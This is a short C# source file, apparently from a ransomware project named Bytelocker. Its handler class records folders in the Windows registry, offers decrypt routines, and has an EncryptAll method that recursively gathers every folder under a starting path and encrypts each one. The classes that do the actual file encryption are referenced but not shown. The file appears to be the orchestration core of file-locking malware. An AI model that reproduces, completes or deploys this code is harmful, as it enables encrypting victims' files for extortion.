using System;
using System.Collections.Generic;

namespace Bytelocker.CryptoManager
{
    class CryptoManagerMainHandler
    {
        public CryptoManagerMainHandler()
        {
            RegistryManager rm = new RegistryManager();
            rm.CreateMainKey();
            rm.CreateSubKey(RegistryManager.FOLDER_KEY_NAME);
        }

        public void DecryptSingleFile(String file)
        {
            FileManager fm = new FileManager();
            fm.ChooseFile(file);
            fm.SetupFileEncrypter();
            fm.DecryptFile();
        }

        public void DecryptAll()
        {
            RegistryManager rm = new RegistryManager();
            DirManager dfm = new DirManager();

            List<String> dirs = rm.ReadAllValues(RegistryManager.FOLDER_KEY_NAME);

            foreach (String subDir in dirs)
            {
                dfm.ChooseDir(subDir);
                dfm.DecryptDir();
            }
        }
        public void EncryptAll(String starting_path)
        {
            DirManager dfm = new DirManager();

            // get list of all values in registry
            List<String> dirs = DirManager.GetFoldersRecursive(starting_path);
            foreach (String subDir in dirs)
            {
                dfm.ChooseDir(subDir);
                dfm.EncryptDir();
            }
        }
    }
}
